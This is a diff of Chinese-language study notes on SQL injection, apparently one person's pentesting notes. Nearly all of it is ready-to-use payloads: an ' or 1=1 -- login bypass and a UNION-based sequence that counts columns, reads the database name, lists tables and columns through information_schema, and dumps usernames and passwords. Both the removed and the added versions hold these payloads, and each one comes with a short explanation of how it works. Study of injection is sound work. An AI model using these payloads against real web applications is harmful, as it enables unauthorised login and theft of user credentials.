@@ -1,38 +1,21 @@
- 'or 1 = 1 --/# 
+一、万能密码（登录绕过）
+Payload：
+' or 1=1 --（用户名框输入，密码任意）
+原理：后端 SQL 拼接为select * from user where username='' or 1=1 --' and password='xxx'；'闭合前引号，or 1=1恒真，--注释密码判断，直接返回所有用户。
 
-union联合查询
-目标与思路：       数据库->数据表->用户->密码；
- 目标：怎么获取所有用户
- 难点：怎么知道数据库用户；
-       怎么知道用户密码在哪张表；
- 处理点：1.当前页面与用户无关；
-        2.select *from news where 时间='20231012';(目前唯一知道的)
-
-步骤：1.判断是否存在注入点，用 and 1=1 和 and 1=2 测试：
-      正常 URL：?id=1
-      真条件：?id=1 and 1=1 → 页面正常显示
-      假条件：?id=1 and 1=2 → 页面无数据 / 报错
-     2.判断原查询的列数，用 ORDER BY 猜列数：
-      ?id=1 ORDER BY 1  -- 正常
-      ?id=1 ORDER BY 2  -- 正常
-      ?id=1 ORDER BY 3  -- 报错
-     3.判断回显位，让原查询无结果（id=-1），用 UNION 拼接查询，看页面显示哪些数字：
-      ?id=-1 UNION SELECT 1,2
-     4.利用回显位读取数据，替换回显位为恶意查询语句，读取库名、表名、字段名、数据。
-      ?id=-1 UNION SELECT 1, database()  -- 库名
-      ?id=-1 UNION SELECT 1, user()      -- 数据库用户名
-      ?id=-1 UNION SELECT 1, version()   -- 数据库版本
-
-实例payload：
-假设目标：?id=1，列数 = 2，回显位 = 2
-查库名：?id=-1' UNION SELECT 1,database()--+ → 得到 test_db
-查表名：?id=-1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema='test_db'--+ → 得到 user
-查字段：?id=-1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='test_db' AND table_name='user'--+ → 得到 username,password
-查数据：?id=-1' UNION SELECT 1,group_concat(username,0x3a,password) FROM test_db.user--+ → 得到 admin:123456,test:test123
-
-
-
-
-
-
-
+二、UNION 注入（有回显，拿数据）
+1. 测列数
+Payload：' order by 6 -- (不报错则列数≥6）
+原理：order by N按第 N 列排序，报错说明无该列，确定列数
+2. 查库名
+Payload：' and 1=2 union select 1,database(),3,4,5,6 -- 
+原理：1=2让原查询无结果，union拼接新查询，database()返回当前库名。
+3. 查所有表
+Payload：' and 1=2 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database() -- 
+原理：information_schema.tables存库表信息，group_concat拼接所有表名。
+4. 查 user 表字段
+Payload：' and 1=2 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name='user' -- 
+原理：information_schema.columns存字段信息，指定表名查列。
+5. 查 user 表数据
+Payload：' and 1=2 union select 1,username,password,4,5,6 from user -- 
+原理：直接查询用户表账号密码，页面回显数据。
